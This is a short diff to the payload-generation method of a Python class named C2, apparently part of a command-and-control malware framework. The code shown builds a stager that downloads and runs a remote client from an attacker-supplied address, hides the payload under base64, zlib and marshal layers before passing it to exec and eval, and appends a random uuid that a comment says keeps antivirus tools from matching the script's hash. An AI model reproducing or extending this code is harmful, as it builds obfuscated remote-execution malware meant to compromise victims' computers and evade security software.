@@ -128,7 +128,9 @@ class C2:
     def generate(self, generate):
         os_name = generate['os']
         arch = generate['arch']
-
+        url = generate['ip']
+        print(url)
+        
         if not os.path.isdir('payloads'):
             os.makedirs('payloads')
 
@@ -148,7 +150,7 @@ create_moduel(url+"client.py").run(url)"""
 from urllib.request import urlopen
 urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
 exec(eval(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))})))))
-#{uuid.uuid4() + uuid.uuid4() + uuid.uuid4() + uuid.uuid4()}"""
+#{uuid.uuid4()}"""
         #this will prevent anti-viruses from looking for hashes of the script
         
         system = platform.system()
